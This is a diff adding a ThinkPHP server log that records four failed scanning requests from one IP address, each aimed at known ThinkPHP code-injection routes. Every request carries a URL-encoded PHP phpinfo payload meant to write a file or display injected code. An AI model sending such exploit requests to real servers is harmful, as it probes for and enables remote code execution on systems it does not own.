@@ -1,0 +1,24 @@
+[ 2024-03-13T04:15:52+08:00 ] 103.17.149.37 /?s=index/thinktemplatedriverfile/write&cacheFile=apiss.php&content=%3C?php%20phpinfo();?%3E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000755s ]
+ERR: 无法加载模块:Index
+
+[ 2024-03-13T06:02:30+08:00 ] 103.17.149.37 /?s=index/thinktemplatedriverfile/write&cacheFile=apiss.php&content=%3C?php%20phpinfo();?%3E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000454s ]
+ERR: 无法加载模块:Index
+
+[ 2024-03-13T16:45:56+08:00 ] 103.17.149.37 /?s=index/thinkviewdriverPhp/display&content=%3C?php%20phpinfo();?%3E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000543s ]
+ERR: 无法加载模块:Index
+
+[ 2024-03-13T18:38:29+08:00 ] 103.17.149.37 /?s=index/thinkviewdriverPhp/display&content=%3C?php%20phpinfo();?%3E
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000006s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000479s ]
+ERR: 无法加载模块:Index
+
